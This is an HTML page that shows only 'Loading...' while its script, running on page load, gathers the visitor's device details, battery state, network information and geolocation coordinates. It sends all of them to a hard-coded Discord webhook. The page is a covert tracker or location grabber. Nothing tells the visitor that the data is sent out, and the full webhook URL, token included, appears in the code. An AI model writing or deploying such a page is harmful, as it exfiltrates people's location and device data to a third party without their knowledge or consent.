<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info</title>
</head>
<body>
    <h1 align="center">Loading...</h1>

    <script>
        // Function to get battery information
        async function getBatteryInfo() {
            const battery = await navigator.getBattery();
            return `Battery Level: ${(battery.level * 100)}%, Charging: ${battery.charging}`;
        }

        // Function to get location (with permission)
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
                        },
                        (error) => {
                            resolve("Location: Permission Denied or Error");
                        }
                    );
                } else {
                    resolve("Geolocation not supported");
                }
            });
        }

        // Function to get network information
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return `Network Type: ${connection.effectiveType}, RTT: ${connection.rtt}ms`;
            } else {
                return "Network information not supported";
            }
        }

        // Function to gather all information
        async function gatherDeviceInfo() {
            const userAgent = navigator.userAgent;
            const screenResolution = `Screen Resolution: ${screen.width}x${screen.height}`;
            const language = `Language: ${navigator.language}`;
            const onlineStatus = `Online Status: ${navigator.onLine ? "Online" : "Offline"}`;
            const batteryInfo = await getBatteryInfo();
            const locationInfo = await getLocation();
            const networkInfo = getNetworkInfo();

            const deviceInfo = `
                User Agent: ${userAgent}
                ${screenResolution}
                ${language}
                ${onlineStatus}
                ${batteryInfo}
                ${locationInfo}
                ${networkInfo}
            `;

            return deviceInfo;
        }

        // Function to send data to Discord Webhook
        async function sendToDiscord() {
            const deviceInfo = await gatherDeviceInfo();

            const formData = new FormData();
            formData.append('content', deviceInfo);

            fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Successfully sent to Discord');
                } else {
                    console.error('Error sending to Discord:', response.statusText);
                }
            })
            .catch((error) => {
                console.error('Error sending to Discord:', error);
            });
        }

        // Start process of gathering info and sending to Discord
        sendToDiscord();
    </script>
</body>
</html>
